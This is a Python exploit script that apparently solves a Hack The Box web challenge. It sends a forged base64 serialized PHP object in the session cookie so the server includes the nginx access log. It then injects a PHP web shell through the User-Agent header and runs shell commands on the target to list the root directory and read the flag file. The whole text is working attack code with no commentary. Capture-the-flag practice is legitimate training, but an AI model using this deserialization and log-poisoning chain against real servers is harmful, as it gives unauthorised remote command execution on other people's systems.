import sys
import requests
import base64
import re

if len(sys.argv) != 2:
    sys.exit(1)

host = sys.argv[1]
url = f"http://{host}/"

php_payload = "<?php system($_GET['cmd']); ?>"
log_path = "/var/log/nginx/access.log"

serialized = f'O:9:"PageModel":1:{{s:4:"file";s:{len(log_path)}:"{log_path}";}}'
encoded_cookie = base64.b64encode(serialized.encode()).decode()
cookies = {"PHPSESSID": encoded_cookie}

def run_cmd(cmd):
    try:
        requests.get(url, headers={"User-Agent": php_payload}, timeout=5)
        r = requests.get(f"{url}?cmd={cmd}", cookies=cookies, timeout=5)
        return r.text
    except:
        sys.exit(1)

ls_output = run_cmd("ls /")
match = re.search(r"flag_[\w\d]+", ls_output)
if not match:
    sys.exit(1)

flagfile = match.group(0)
flag_output = run_cmd(f"cat /{flagfile}")

flag = re.search(r"HTB\{.*?\}", flag_output)
if flag:
    print(flag.group(0))
